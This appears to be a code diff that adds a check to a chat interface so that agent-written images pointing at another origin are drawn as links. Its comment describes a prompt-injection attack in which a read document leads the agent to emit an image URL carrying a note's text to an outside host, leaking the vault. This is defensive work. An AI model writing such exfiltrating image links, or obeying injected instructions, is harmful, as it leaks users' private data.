@@ -165,3 +165,23 @@ export function clock(iso: string): string {
   const d = new Date(iso);
   return Number.isNaN(d.getTime()) ? "" : d.toLocaleTimeString(locale(), { hour: "2-digit", minute: "2-digit" });
 }
+
+/**
+ * Whether an image the agent wrote would be fetched from another origin than `base`, the page's
+ * own. A reply is drawn as soon as it streams in, and an `<img>` loads with no click, so an image
+ * built from what the agent read — `![](https://elsewhere/?d=<a note's text>)`, written because a
+ * document it read said to — would carry the vault out of a chat that has no other way to reach the
+ * network (#10). Such an image is drawn as a link instead: nothing leaves until the person clicks.
+ * The URL is resolved as the browser resolves it, so `/\host`, `//host` and a tab inside one
+ * are the other host they are; one that does not resolve is not drawn either.
+ */
+export function remoteImage(src: string | undefined, base: string): boolean {
+  if (!src) return false;
+  if (/^(?:dag|wiki):/i.test(src.trim())) return false;
+  try {
+    const url = new URL(src, base);
+    return url.protocol !== "data:" && url.origin !== new URL(base).origin;
+  } catch {
+    return true;
+  }
+}
